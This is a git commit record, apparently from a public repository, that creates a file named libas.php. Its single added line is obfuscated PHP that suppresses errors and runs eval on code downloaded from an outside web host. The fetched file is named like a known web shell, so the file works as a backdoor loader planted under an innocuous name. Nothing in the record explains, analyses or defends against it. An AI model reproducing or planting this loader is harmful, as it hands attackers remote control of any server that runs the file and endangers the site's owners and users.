9e190736dfba0ff27544ba6c1cc7747d547dc91d
baymax403 <riannaaini@gmail.com>
2025-04-08 16:15:11 +0700

    Create libas.php

---
+++ libas.php
@@ -0,0 +1,1 @@
+<?=/****/@/*66666*/null; /******/@/*66666*/error_reporting(0);/****/@/*66666*/null; /******/@/*66666*/eval/******/("?>".file_get_contents("https://shell.prinsh.com/Nathan/alfa.txt"))?>
